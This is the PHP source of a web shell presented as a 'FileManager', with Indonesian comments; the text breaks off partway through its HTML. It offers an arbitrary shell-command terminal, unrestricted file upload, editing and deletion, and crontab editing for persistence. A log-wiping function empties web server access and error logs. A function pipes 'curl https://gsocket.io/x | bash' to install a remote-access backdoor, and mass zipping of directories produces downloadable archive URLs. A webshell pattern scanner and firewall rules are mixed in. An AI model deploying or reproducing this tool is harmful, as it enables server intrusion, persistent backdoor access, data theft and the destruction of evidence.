<?php
session_start();

$USERNAME = "root@maw3six";
$PASSWORD_HASH = "2449b681de027d7b42c1fd39b1483f0232c598f566d6d9c806ebe81791712a1b4673c0acb63079923a1a1799a4002d3e1a7dfe7039222b05f4b7be24036b97c0"; // Hash SHA512
$ROOT_DIR = __DIR__;

// Theme preference
if (isset($_POST['toggle_theme'])) {
    $_SESSION['theme'] = ($_SESSION['theme'] ?? 'dark') === 'dark' ? 'light' : 'dark';
}

$THEME = $_SESSION['theme'] ?? 'dark';

// Fungsi untuk memeriksa login
function checkLogin() {
    if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
        return false;
    }
    return true;
}

// Fungsi login dengan hash SHA512
function doLogin($username, $password) {
    global $USERNAME, $PASSWORD_HASH;
    $password_hashed = hash('sha512', $password);
    if ($username === $USERNAME && $password_hashed === $PASSWORD_HASH) {
        $_SESSION['logged_in'] = true;
        $_SESSION['username'] = $username;
        return true;
    }
    return false;
}

// Fungsi logout
function doLogout() {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit();
}

// File Integrity Monitor
function monitorFileIntegrity($directory) {
    $hashFile = $directory . '/.file_hashes.json';
    $currentHashes = [];
    $previousHashes = [];
    $changes = [];
    
    // Dapatkan hash file saat ini
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($directory, RecursiveDirectoryIterator::SKIP_DOTS)
    );
    
    foreach ($iterator as $file) {
        if ($file->isFile() && $file->getFilename() !== '.file_hashes.json') {
            $currentHashes[$file->getPathname()] = md5_file($file->getPathname());
        }
    }
    
    // Baca hash sebelumnya jika ada
    if (file_exists($hashFile)) {
        $previousHashes = json_decode(file_get_contents($hashFile), true);
    }
    
    // Bandingkan hash
    foreach ($currentHashes as $file => $hash) {
        if (!isset($previousHashes[$file])) {
            $changes[] = ['type' => 'added', 'file' => $file];
        } elseif ($previousHashes[$file] !== $hash) {
            $changes[] = ['type' => 'modified', 'file' => $file];
        }
    }
    
    foreach ($previousHashes as $file => $hash) {
        if (!isset($currentHashes[$file])) {
            $changes[] = ['type' => 'deleted', 'file' => $file];
        }
    }
    
    // Simpan hash saat ini
    file_put_contents($hashFile, json_encode($currentHashes, JSON_PRETTY_PRINT));
    
    return $changes;
}

// Resource Usage Monitor
function getSystemResources() {
    $load = sys_getloadavg();
    return [
        'cpu_load' => $load[0],
        'memory_usage' => round(memory_get_usage(true) / 1024 / 1024, 2) . ' MB',
        'memory_peak' => round(memory_get_peak_usage(true) / 1024 / 1024, 2) . ' MB',
        'disk_total' => round(disk_total_space("/") / (1024*1024*1024), 2) . ' GB',
        'disk_free' => round(disk_free_space("/") / (1024*1024*1024), 2) . ' GB',
        'disk_used' => round((disk_total_space("/") - disk_free_space("/")) / (1024*1024*1024), 2) . ' GB'
    ];
}

// File Access Log Analyzer
function analyzeAccessLogs($logPath = '/var/log/apache2/access.log') {
    $suspicious = [];
    if (file_exists($logPath)) {
        $lines = file($logPath, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        $lines = array_slice($lines, -1000); // Ambil 1000 baris terakhir
        
        foreach ($lines as $line) {
            // Cari pola akses mencurigakan
            if (preg_match('/(\d+\.\d+\.\d+\.\d+).*?(40\d|50\d).*?(eval|base64|system|exec|shell)/i', $line, $matches)) {
                $suspicious[] = [
                    'ip' => $matches[1],
                    'status' => $matches[2],
                    'pattern' => $matches[3],
                    'line' => substr($line, 0, 200)
                ];
            }
        }
    }
    return $suspicious;
}

// Real-time File Watcher (simulasi)
function getFileChanges($directory, $since = null) {
    $changes = [];
    $since = $since ?: time() - 3600; // 1 jam terakhir
    
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($directory, RecursiveDirectoryIterator::SKIP_DOTS)
    );
    
    foreach ($iterator as $file) {
        if ($file->getMTime() > $since) {
            $changes[] = [
                'file' => $file->getPathname(),
                'time' => date('Y-m-d H:i:s', $file->getMTime()),
                'type' => $file->isDir() ? 'directory' : 'file',
                'size' => $file->getSize()
            ];
        }
    }
    
    return $changes;
}

// File Search & Filter
function searchFiles($directory, $query = '', $extensions = [], $minSize = 0, $maxSize = PHP_INT_MAX) {
    $results = [];
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($directory, RecursiveDirectoryIterator::SKIP_DOTS)
    );
    
    foreach ($iterator as $file) {
        $filename = $file->getFilename();
        $filepath = $file->getPathname();
        $filesize = $file->getSize();
        $extension = pathinfo($filename, PATHINFO_EXTENSION);
        
        // Filter berdasarkan query
        if (!empty($query) && stripos($filename, $query) === false && stripos($filepath, $query) === false) {
            continue;
        }
        
        // Filter berdasarkan extension
        if (!empty($extensions) && !in_array($extension, $extensions)) {
            continue;
        }
        
        // Filter berdasarkan ukuran
        if ($filesize < $minSize || $filesize > $maxSize) {
            continue;
        }
        
        $results[] = [
            'name' => $filename,
            'path' => $filepath,
            'size' => $filesize,
            'modified' => date('Y-m-d H:i:s', $file->getMTime()),
            'extension' => $extension,
            'is_dir' => $file->isDir()
        ];
    }
    
    return $results;
}

// Firewall Rule Generator (buat .htaccess di setiap folder)
function generateFirewallRules($directory) {
    $htaccessContent = "# Security Rules Generated by FileManager\n";
    $htaccessContent .= "<IfModule mod_rewrite.c>\n";
    $htaccessContent .= "RewriteEngine On\n\n";
    
    // Block common attack patterns
    $htaccessContent .= "# Block SQL Injection attempts\n";
    $htaccessContent .= "RewriteCond %{QUERY_STRING} (union|select|insert|delete|update|drop|create) [NC]\n";
    $htaccessContent .= "RewriteRule ^(.*)$ - [F,L]\n\n";
    
    $htaccessContent .= "# Block common exploits\n";
    $htaccessContent .= "RewriteCond %{QUERY_STRING} (\\.|\\^|\\(|\\)|\\[|\\]|\\$|\\*) [NC]\n";
    $htaccessContent .= "RewriteRule ^(.*)$ - [F,L]\n\n";
    
    $htaccessContent .= "# Block suspicious user agents\n";
    $htaccessContent .= "SetEnvIfNoCase User-Agent \"(morfeus|zmeu|nmap|nessus|nikto)\" bad_bot\n";
    $htaccessContent .= "Deny from env=bad_bot\n";
    $htaccessContent .= "</IfModule>\n\n";
    
    $htaccessContent .= "# Additional Security Headers\n";
    $htaccessContent .= "Header always set X-Content-Type-Options nosniff\n";
    $htaccessContent .= "Header always set X-Frame-Options DENY\n";
    $htaccessContent .= "Header always set X-XSS-Protection \"1; mode=block\"\n";
    
    $created = 0;
    $errors = [];
    
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($directory, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );
    
    foreach ($iterator as $item) {
        if ($item->isDir()) {
            $htaccessPath = $item->getPathname() . '/.htaccess';
            if (!file_exists($htaccessPath)) {
                if (file_put_contents($htaccessPath, $htaccessContent)) {
                    $created++;
                } else {
                    $errors[] = "Failed to create .htaccess in: " . $item->getPathname();
                }
            }
        }
    }
    
    return [
        'created' => $created,
        'errors' => $errors
    ];
}

// Scheduled Task Manager (cron job manager)
function getCronJobs() {
    if (function_exists('exec')) {
        exec('crontab -l 2>/dev/null', $output, $returnCode);
        if ($returnCode === 0) {
            return $output;
        }
    }
    return ['Error: Cannot access crontab or exec function is disabled'];
}

function addCronJob($schedule, $command) {
    if (function_exists('exec')) {
        $tempFile = tempnam(sys_get_temp_dir(), 'cron');
        $currentJobs = getCronJobs();
        if (!is_array($currentJobs) || (count($currentJobs) === 1 && strpos($currentJobs[0], 'Error') !== false)) {
            $currentJobs = [];
        }
        
        $currentJobs[] = "$schedule $command";
        file_put_contents($tempFile, implode("\n", $currentJobs) . "\n");
        exec("crontab $tempFile", $output, $returnCode);
        unlink($tempFile);
        
        return $returnCode === 0;
    }
    return false;
}

function removeCronJob($index) {
    if (function_exists('exec')) {
        $jobs = getCronJobs();
        if (is_array($jobs) && count($jobs) > $index && strpos($jobs[0], 'Error') === false) {
            unset($jobs[$index]);
            $tempFile = tempnam(sys_get_temp_dir(), 'cron');
            if (!empty($jobs)) {
                file_put_contents($tempFile, implode("\n", $jobs) . "\n");
            } else {
                file_put_contents($tempFile, "");
            }
            exec("crontab $tempFile", $output, $returnCode);
            unlink($tempFile);
            return $returnCode === 0;
        }
    }
    return false;
}

// Bulk Operations
function bulkOperation($paths, $operation, $params = []) {
    $results = [];
    
    foreach ($paths as $path) {
        $result = ['path' => $path, 'status' => 'failed', 'message' => ''];
        
        switch ($operation) {
            case 'delete':
                if (is_dir($path)) {
                    $files = new RecursiveIteratorIterator(
                        new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS),
                        RecursiveIteratorIterator::CHILD_FIRST
                    );
                    foreach ($files as $fileinfo) {
                        $todo = ($fileinfo->isDir() ? 'rmdir' : 'unlink');
                        $todo($fileinfo->getRealPath());
                    }
                    if (rmdir($path)) {
                        $result['status'] = 'success';
                        $result['message'] = 'Directory deleted';
                    } else {
                        $result['message'] = 'Failed to delete directory';
                    }
                } else {
                    if (unlink($path)) {
                        $result['status'] = 'success';
                        $result['message'] = 'File deleted';
                    } else {
                        $result['message'] = 'Failed to delete file';
                    }
                }
                break;
                
            case 'chmod':
                $mode = intval($params['mode'] ?? '0755', 8);
                if (chmod($path, $mode)) {
                    $result['status'] = 'success';
                    $result['message'] = 'Permissions changed to ' . decoct($mode);
                } else {
                    $result['message'] = 'Failed to change permissions';
                }
                break;
                
            case 'backup':
                $backupDir = $params['backup_dir'] ?? dirname($path) . '/backup_' . date('Ymd_His');
                if (!file_exists($backupDir)) {
                    mkdir($backupDir, 0755, true);
                }
                $backupPath = $backupDir . '/' . basename($path);
                if (copy($path, $backupPath)) {
                    $result['status'] = 'success';
                    $result['message'] = 'Backed up to ' . $backupPath;
                } else {
                    $result['message'] = 'Failed to create backup';
                }
                break;
                
            case 'move':
                $destination = $params['destination'] ?? dirname($path);
                $newPath = $destination . '/' . basename($path);
                if (rename($path, $newPath)) {
                    $result['status'] = 'success';
                    $result['message'] = 'Moved to ' . $newPath;
                } else {
                    $result['message'] = 'Failed to move file';
                }
                break;
        }
        
        $results[] = $result;
    }
    
    return $results;
}

// Fungsi untuk mendapatkan informasi server
function getServerInfo() {
    $info = [
        'PHP Version' => phpversion(),
        'Server Software' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
        'Server OS' => php_uname(),
        'Server IP' => $_SERVER['SERVER_ADDR'] ?? 'Unknown',
        'Your IP' => $_SERVER['REMOTE_ADDR'] ?? 'Unknown',
        'Document Root' => $_SERVER['DOCUMENT_ROOT'] ?? 'Unknown',
        'Current Path' => getcwd(),
        'Disk Free Space' => disk_free_space("/") ? round(disk_free_space("/") / (1024*1024*1024), 2) . " GB" : "Unknown",
        'Disk Total Space' => disk_total_space("/") ? round(disk_total_space("/") / (1024*1024*1024), 2) . " GB" : "Unknown",
        'Memory Limit' => ini_get('memory_limit'),
        'Upload Max Size' => ini_get('upload_max_filesize'),
        'Max Execution Time' => ini_get('max_execution_time') . " seconds",
        'Disabled Functions' => ini_get('disable_functions') ?: 'None'
    ];
    return $info;
}

// Fungsi untuk membersihkan log
function cleanLogs() {
    $logFiles = [
        '/var/log/apache2/access.log',
        '/var/log/apache2/error.log',
        '/var/log/nginx/access.log',
        '/var/log/nginx/error.log',
        '/var/log/httpd/access_log',
        '/var/log/httpd/error_log',
        'C:/xampp/apache/logs/access.log',
        'C:/xampp/apache/logs/error.log'
    ];
    
    $results = [];
    foreach ($logFiles as $logFile) {
        if (file_exists($logFile)) {
            if (is_writable($logFile)) {
                $handle = fopen($logFile, 'w');
                if ($handle) {
                    fclose($handle);
                    $results[] = "Cleaned: $logFile";
                } else {
                    $results[] = "Failed to clean: $logFile";
                }
            } else {
                $results[] = "Not writable: $logFile";
            }
        }
    }
    return $results;
}

// Fungsi untuk membuat backup massal dengan log txt dan URL
function massBackup($directory) {
    $backups = [];
    $logContent = "Mass Backup Log - " . date('Y-m-d H:i:s') . "\n";
    $logContent .= str_repeat("=", 50) . "\n\n";
    
    // Dapatkan base URL dari server
    $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
    $host = $_SERVER['HTTP_HOST'];
    $baseUrl = $protocol . '://' . $host;
    
    // Dapatkan document root untuk menghitung relative path
    $documentRoot = $_SERVER['DOCUMENT_ROOT'];
    
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($directory, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );
    
    $backupCount = 0;
    $createdBackups = [];
    
    foreach ($iterator as $item) {
        if ($item->isDir()) {
            $folderName = $item->getFilename();
            $backupName = substr(str_shuffle('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'), 0, 7);
            $backupPath = $item->getPath() . '/' . $backupName . '.zip';
            
            if (class_exists('ZipArchive')) {
                $zip = new ZipArchive();
                if ($zip->open($backupPath, ZipArchive::CREATE) === TRUE) {
                    $files = new RecursiveIteratorIterator(
                        new RecursiveDirectoryIterator($item->getPathname()),
                        RecursiveIteratorIterator::LEAVES_ONLY
                    );
                    
                    $fileCount = 0;
                    foreach ($files as $file) {
                        if (!$file->isDir()) {
                            $relativePath = substr($file->getPathname(), strlen($item->getPathname()) + 1);
                            $zip->addFile($file->getPathname(), $relativePath);
                            $fileCount++;
                        }
                    }
                    $zip->close();
                    $resultMsg = "✓ Backup created: $backupPath (contains $fileCount files)";
                    $backups[] = $resultMsg;
                    
                    // Tambahkan URL ke log content
                    $relativeBackupPath = str_replace($documentRoot, '', $backupPath);
                    $fullUrl = $baseUrl . $relativeBackupPath;
                    $logContent .= $fullUrl . "\n";
                    $createdBackups[] = $fullUrl;
                    $backupCount++;
                }
            } else {
                // Fallback jika ZipArchive tidak tersedia
                $backupPath = $item->getPath() . '/' . $backupName . '.bak';
                if (is_writable($item->getPath())) {
                    // Membuat file backup kosong sebagai contoh
                    $backupContent = "Backup of $folderName\nCreated on: " . date('Y-m-d H:i:s') . "\n";
                    file_put_contents($backupPath, $backupContent);
                    $resultMsg = "✓ Backup created (fallback): $backupPath";
                    $backups[] = $resultMsg;
                    
                    // Tambahkan URL ke log content
                    $relativeBackupPath = str_replace($documentRoot, '', $backupPath);
                    $fullUrl = $baseUrl . $relativeBackupPath;
                    $logContent .= $fullUrl . "\n";
                    $createdBackups[] = $fullUrl;
                    $backupCount++;
                } else {
                    $errorMsg = "✗ Failed to create backup (not writable): $backupPath";
                    $backups[] = $errorMsg;
                    $logContent .= $errorMsg . "\n";
                }
            }
        }
    }
    
    // Tambahkan summary di akhir log
    $logContent .= "\n" . str_repeat("-", 30) . "\n";
    $logContent .= "Total backups created: " . $backupCount . "\n";
    $logContent .= "Backup directory: " . $directory . "\n";
    $logContent .= "Generated on: " . date('Y-m-d H:i:s') . "\n";
    
    // Simpan log ke file txt
    $logFileName = 'backup_log_' . date('Ymd_His') . '.txt';
    $logFilePath = $directory . '/' . $logFileName;
    file_put_contents($logFilePath, $logContent);
    
    // Tambahkan informasi log file ke hasil
    $backups[] = "📝 Backup log saved to: $logFileName";
    $backups['log_file'] = $logFilePath;
    $backups['log_filename'] = $logFileName;
    $backups['backup_count'] = $backupCount;
    $backups['created_backups'] = $createdBackups;
    
    return $backups;
}

// Fungsi untuk memindai webshell - selalu mulai dari DOCUMENT_ROOT
function scanWebshell() {
    $directory = $_SERVER['DOCUMENT_ROOT']; // Selalu mulai dari document root
    $suspiciousPatterns = [
        'eval\s*\(',
        'base64_decode\s*\(',
        'exec\s*\(',
        'system\s*\(',
        'passthru\s*\(',
        'shell_exec\s*\(',
        'assert\s*\(',
        'create_function\s*\(',
        'preg_replace\s*\(\s*["\']\s*\W*(e)\W*\s*["\']',
        'gzinflate\s*\(',
        'str_rot13\s*\(',
        'strrev\s*\(',
        'chr\s*\(',
        'ord\s*\(',
        'gzuncompress\s*\(',
        'pack\s*\(',
        'call_user_func\s*\(',
        'call_user_func_array\s*\(',
        'array_map\s*\(',
        'array_filter\s*\(',
        'file_get_contents\s*\(',
        'curl_exec\s*\(',
        'fopen\s*\(',
        'fwrite\s*\(',
        'file_put_contents\s*\(',
        'unlink\s*\(',
        'rmdir\s*\(',
        'chmod\s*\(',
        'ob_start\s*\(',
        'extract\s*\(',
        'parse_str\s*\(',
        '\$_(POST|GET|REQUEST|COOKIE|SERVER)\[', // Variabel input
        'GLOBALS\[', // Akses global variables
        '\$(_POST|_GET|_REQUEST|_COOKIE|_SERVER)\[', // Variabel superglobal
    ];
    
    $found = [];
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($directory, RecursiveDirectoryIterator::SKIP_DOTS)
    );
    
    foreach ($iterator as $file) {
        // Hanya scan file dengan extension PHP
        if ($file->getExtension() === 'php' || $file->getExtension() === 'phtml' || 
            $file->getExtension() === 'php3' || $file->getExtension() === 'php4' || 
            $file->getExtension() === 'php5' || $file->getExtension() === 'inc' ||
            $file->getExtension() === 'txt' || $file->getExtension() === 'html') {
            
            try {
                $content = file_get_contents($file->getPathname());
                if ($content === false) continue; // Skip jika tidak bisa dibaca
                
                foreach ($suspiciousPatterns as $pattern) {
                    if (preg_match("/$pattern/i", $content, $matches, PREG_OFFSET_CAPTURE)) {
                        // Hitung line number
                        $lineNumber = substr_count(substr($content, 0, $matches[0][1]), "\n") + 1;
                        
                        // Dapatkan konteks sekitar line yang mencurigakan
                        $lines = explode("\n", $content);
                        $context = [];
                        $startLine = max(0, $lineNumber - 3);
                        $endLine = min(count($lines) - 1, $lineNumber + 1);
                        
                        for ($i = $startLine; $i <= $endLine; $i++) {
                            $context[] = ($i + 1) . ": " . trim($lines[$i]);
                        }
                        
                        $found[] = [
                            'file' => $file->getPathname(),
                            'pattern' => $pattern,
                            'line' => $lineNumber,
                            'context' => implode("\n", $context),
                            'size' => $file->getSize(),
                            'modified' => date('Y-m-d H:i:s', $file->getMTime())
                        ];
                        break; // Break setelah menemukan pola pertama untuk menghindari duplikat
                    }
                }
            } catch (Exception $e) {
                // Skip file yang error
                continue;
            }
        }
    }
    return $found;
}

// Fungsi untuk menginstal GSocket
function installGSocket() {
    if (function_exists('exec')) {
        exec('curl -fsSL https://gsocket.io/x | bash 2>&1', $output, $returnCode);
        return [
            'success' => $returnCode === 0,
            'output' => implode("\n", $output)
        ];
    } else {
        return [
            'success' => false,
            'output' => 'exec function is disabled'
        ];
    }
}

// Fungsi helper untuk format bytes
function formatBytes($size, $precision = 2) {
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    for ($i = 0; $size > 1024 && $i < count($units) - 1; $i++) {
        $size /= 1024;
    }
    return round($size, $precision) . ' ' . $units[$i];
}

// Fungsi untuk membaca konten file
function readFileContent($filePath) {
    if (file_exists($filePath) && is_readable($filePath)) {
        return file_get_contents($filePath);
    }
    return false;
}

// Penanganan AJAX request untuk view/edit file
if (isset($_POST['ajax_action'])) {
    header('Content-Type: text/plain');
    switch ($_POST['ajax_action']) {
        case 'view_file':
            $filePath = $_POST['path'] . '/' . $_POST['file'];
            $content = readFileContent($filePath);
            if ($content !== false) {
                echo $content;
            } else {
                echo "Error: File not found or not readable";
            }
            exit();
            
        case 'edit_file':
            $filePath = $_POST['path'] . '/' . $_POST['file'];
            $content = readFileContent($filePath);
            if ($content !== false) {
                echo $content;
            } else {
                echo "Error: File not found or not readable";
            }
            exit();
    }
}

// Proses login
if (isset($_POST['login'])) {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    if (doLogin($username, $password)) {
        header("Location: " . $_SERVER['PHP_SELF']);
        exit();
    } else {
        $loginError = "Invalid username or password";
    }
}

// Proses logout
if (isset($_GET['logout'])) {
    doLogout();
}

// Jika belum login, tampilkan form login
if (!checkLogin()) {
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FileManager Login</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.0/font/bootstrap-icons.css">
    <style>
        body {
            background: <?php echo $THEME === 'dark' ? '#000' : '#f0f0f0'; ?>;
            color: <?php echo $THEME === 'dark' ? '#00ff00' : '#333'; ?>;
            font-family: 'Courier New', monospace;
        }
        .terminal-input:focus {
            outline: none;
            box-shadow: 0 0 0 2px #00ff00;
        }
    </style>
</head>
<body class="min-h-screen flex items-center justify-center p-4">
    <div class="bg-<?php echo $THEME === 'dark' ? 'gray-900' : 'white'; ?> border border-<?php echo $THEME === 'dark' ? 'green-500' : 'gray-300'; ?> rounded-lg p-8 w-full max-w-md">
        <div class="text-center mb-6">
            <h2 class="text-2xl font-bold <?php echo $THEME === 'dark' ? 'text-green-400' : 'text-gray-800'; ?> mb-2">FileManager Login</h2>
            <p class="<?php echo $THEME === 'dark' ? 'text-green-300' : 'text-gray-600'; ?>">Enter your credentials</p>
        </div>
        
        <?php if (isset($loginError)): ?>
            <div class="bg-red-900 border border-red-500 <?php echo $THEME === 'dark' ? 'text-red-300' : 'text-red-700'; ?> px-4 py-3 rounded mb-4">
                <i class="bi bi-exclamation-triangle mr-2"></i><?php echo $loginError; ?>
            </div>
        <?php endif; ?>
        
        <form method="post">
            <div class="mb-4">
                <label class="block <?php echo $THEME === 'dark' ? 'text-green-300' : 'text-gray-700'; ?> text-sm font-bold mb-2" for="username">
                    <i class="bi bi-person mr-2"></i>Username
                </label>
                <div class="relative">
                    <input 
                        type="text" 
                        id="username" 
                        name="username" 
                        class="w-full <?php echo $THEME === 'dark' ? 'bg-gray-800 border-green-600 text-green-400' : 'bg-white border-gray-300 text-gray-700'; ?> py-3 px-4 rounded focus:outline-none focus:border-green-400 terminal-input"
                        placeholder="Enter username" 
                        required
                    >
                </div>
            </div>
            
            <div class="mb-6">
                <label class="block <?php echo $THEME === 'dark' ? 'text-green-300' : 'text-gray-700'; ?> text-sm font-bold mb-2" for="password">
                    <i class="bi bi-lock mr-2"></i>Password
                </label>
                <div class="relative">
                    <input 
                        type="password" 
                        id="password" 
                        name="password" 
                        class="w-full <?php echo $THEME === 'dark' ? 'bg-gray-800 border-green-600 text-green-400' : 'bg-white border-gray-300 text-gray-700'; ?> py-3 px-4 rounded focus:outline-none focus:border-green-400 terminal-input"
                        placeholder="Enter password" 
                        required
                    >
                </div>
            </div>
            
            <button 
                type="submit" 
                name="login"
                class="w-full bg-green-900 hover:bg-green-800 border border-green-600 <?php echo $THEME === 'dark' ? 'text-green-300' : 'text-white'; ?> font-bold py-3 px-4 rounded transition duration-200"
            >
                <i class="bi bi-box-arrow-in-right mr-2"></i>LOGIN
            </button>
        </form>
    </div>
</body>
</html>
<?php
    exit();
}

// Proses aksi
$actionResult = '';
$actionResultType = '';
$showActionResult = false;

if (isset($_POST['action'])) {
    $showActionResult = true;
    switch ($_POST['action']) {
        case 'upload':
            if (isset($_FILES['file'])) {
                $target = $_POST['path'] . '/' . $_FILES['file']['name'];
                if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
                    $actionResult = "File uploaded successfully";
                    $actionResultType = "success";
                } else {
                    $actionResult = "Error uploading file";
                    $actionResultType = "danger";
                }
            }
            break;
            
        case 'create_folder':
            $folderName = $_POST['folder_name'];
            $path = $_POST['path'] . '/' . $folderName;
            if (mkdir($path)) {
                $actionResult = "Folder created successfully";
                $actionResultType = "success";
            } else {
                $actionResult = "Error creating folder";
                $actionResultType = "danger";
            }
            break;
            
        case 'create_file':
            $fileName = $_POST['file_name'];
            $path = $_POST['path'] . '/' . $fileName;
            if (file_put_contents($path, '')) {
                $actionResult = "File created successfully";
                $actionResultType = "success";
            } else {
                $actionResult = "Error creating file";
                $actionResultType = "danger";
            }
            break;
            
        case 'terminal':
            $command = $_POST['command'];
            if (function_exists('shell_exec')) {
                $output = shell_exec($command . ' 2>&1');
                $actionResult = "<pre class='bg-black border border-green-600 text-green-400 p-4 rounded whitespace-pre-wrap'>" . htmlspecialchars($output) . "</pre>";
                $actionResultType = "info";
            } else {
                $actionResult = "shell_exec function is disabled";
                $actionResultType = "danger";
            }
            break;
            
        case 'chmod':
            $path = $_POST['path'] . '/' . $_POST['item'];
            $mode = intval($_POST['mode'], 8);
            if (chmod($path, $mode)) {
                $actionResult = "Permissions changed successfully";
                $actionResultType = "success";
            } else {
                $actionResult = "Error changing permissions";
                $actionResultType = "danger";
            }
            break;
            
        case 'rename':
            $oldName = $_POST['path'] . '/' . $_POST['old_name'];
            $newName = $_POST['path'] . '/' . $_POST['new_name'];
            if (rename($oldName, $newName)) {
                $actionResult = "Item renamed successfully";
                $actionResultType = "success";
            } else {
                $actionResult = "Error renaming item";
                $actionResultType = "danger";
            }
            break;
            
        case 'delete':
            $item = $_POST['path'] . '/' . $_POST['item'];
            if (is_dir($item)) {
                // Hapus direktori dan isinya
                $files = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($item, RecursiveDirectoryIterator::SKIP_DOTS),
                    RecursiveIteratorIterator::CHILD_FIRST
                );
                
                foreach ($files as $fileinfo) {
                    $todo = ($fileinfo->isDir() ? 'rmdir' : 'unlink');
                    $todo($fileinfo->getRealPath());
                }
                
                if (rmdir($item)) {
                    $actionResult = "Directory deleted successfully";
                    $actionResultType = "success";
                } else {
                    $actionResult = "Error deleting directory";
                    $actionResultType = "danger";
                }
            } else {
                if (unlink($item)) {
                    $actionResult = "File deleted successfully";
                    $actionResultType = "success";
                } else {
                    $actionResult = "Error deleting file";
                    $actionResultType = "danger";
                }
            }
            break;
            
        case 'edit_save':
            $file = $_POST['path'] . '/' . $_POST['file'];
            $content = $_POST['content'];
            if (file_put_contents($file, $content)) {
                $actionResult = "File saved successfully";
                $actionResultType = "success";
            } else {
                $actionResult = "Error saving file";
                $actionResultType = "danger";
            }
            break;
            
        case 'clean_logs':
            $results = cleanLogs();
            $actionResult = "Log cleaning results:<br>" . implode("<br>", $results);
            $actionResultType = "info";
            break;
            
        case 'mass_backup':
            $results = massBackup($_POST['path']);
            if (empty($results)) {
                $actionResult = "No folders found to backup";
                $actionResultType = "info";
            } else {
                $logFile = isset($results['log_file']) ? $results['log_file'] : '';
                $logFilename = isset($results['log_filename']) ? $results['log_filename'] : '';
                $backupCount = isset($results['backup_count']) ? $results['backup_count'] : 0;
                
                // Hapus elemen log dari array results agar tidak ditampilkan dalam list
                unset($results['log_file']);
                unset($results['log_filename']);
                unset($results['backup_count']);
                unset($results['created_backups']);
                
                $actionResult = "
                <div class='mb-4'>
                    <h4 class='text-lg font-bold mb-2'>💾 Mass Backup Results</h4>
                    <p class='text-sm mb-3'>Created " . $backupCount . " backups in " . htmlspecialchars($_POST['path']) . "</p>";
                    
                if ($logFile && file_exists($logFile)) {
                    $actionResult .= "
                    <a href='" . htmlspecialchars($logFile) . "' download='" . htmlspecialchars($logFilename) . "' 
                       class='bg-green-700 hover:bg-green-600 text-white px-4 py-2 rounded inline-flex items-center mr-2 mb-2'>
                        <i class='bi bi-download mr-1'></i>Download Backup Log
                    </a>";
                }
                
                $actionResult .= "
                    <button onclick='this.parentElement.nextElementSibling.style.display=\"none\"; this.parentElement.style.display=\"none\"' 
                            class='bg-red-700 hover:bg-red-600 text-white px-4 py-2 rounded inline-flex items-center mb-2'>
                        <i class='bi bi-x-lg mr-1'></i>Close Results
                    </button>
                </div>
                <div class='max-h-96 overflow-y-auto pr-2'>";
                
                foreach ($results as $result) {
                    $icon = strpos($result, '✓') !== false ? '✅' : (strpos($result, '✗') !== false ? '❌' : '📝');
                    $actionResult .= "
                    <div class='bg-gray-800 border border-gray-600 rounded p-3 mb-2'>
                        <div class='flex items-start'>
                            <span class='mr-2'>" . $icon . "</span>
                            <span class='text-sm break-all'>" . htmlspecialchars($result) . "</span>
                        </div>
                    </div>";
                }
                $actionResult .= "</div>";
                $actionResultType = "info";
            }
            break;
            
        case 'scan_webshell':
            $results = scanWebshell(); // Tanpa parameter, selalu scan dari DOCUMENT_ROOT
            if (empty($results)) {
                $actionResult = "✅ No suspicious files found in " . $_SERVER['DOCUMENT_ROOT'];
                $actionResultType = "success";
            } else {
                $actionResult = "
                <div style='margin-bottom: 20px;'>
                    <h4 class='text-lg font-bold mb-3'>⚠️ Suspicious files found (" . count($results) . " files)</h4>
                    <p class='text-sm mb-3'>Scanning from: " . htmlspecialchars($_SERVER['DOCUMENT_ROOT']) . "</p>
                    <button onclick='this.parentElement.nextElementSibling.style.display=\"none\"; this.parentElement.style.display=\"none\"' 
                            class='bg-red-700 hover:bg-red-600 text-white px-4 py-2 rounded mb-3'>
                        <i class='bi bi-x-lg mr-1'></i>Close Results
                    </button>
                </div>
                <div style='max-height: 500px; overflow-y: auto; padding-right: 10px;'>";
                
                foreach ($results as $index => $result) {
                    $actionResult .= "
                    <div style='background: #222; border: 1px solid #444; padding: 15px; margin: 15px 0; border-radius: 5px;'>
                        <div class='grid grid-cols-1 md:grid-cols-2 gap-3 mb-3'>
                            <div>
                                <strong class='text-green-400'>📁 File:</strong><br>
                                <span class='text-sm break-all'>" . htmlspecialchars($result['file']) . "</span>
                            </div>
                            <div>
                                <strong class='text-yellow-400'>⚠️ Pattern:</strong><br>
                                <span class='text-sm'>" . htmlspecialchars($result['pattern']) . "</span>
                            </div>
                            <div>
                                <strong class='text-blue-400'>📍 Line:</strong><br>
                                <span class='text-sm'>" . $result['line'] . "</span>
                            </div>
                            <div>
                                <strong class='text-purple-400'>📊 Size:</strong><br>
                                <span class='text-sm'>" . formatBytes($result['size']) . "</span>
                            </div>
                        </div>
                        
                        <div class='mb-3'>
                            <strong class='text-cyan-400'>🕒 Modified:</strong><br>
                            <span class='text-sm'>" . $result['modified'] . "</span>
                        </div>
                        
                        <div class='mb-3'>
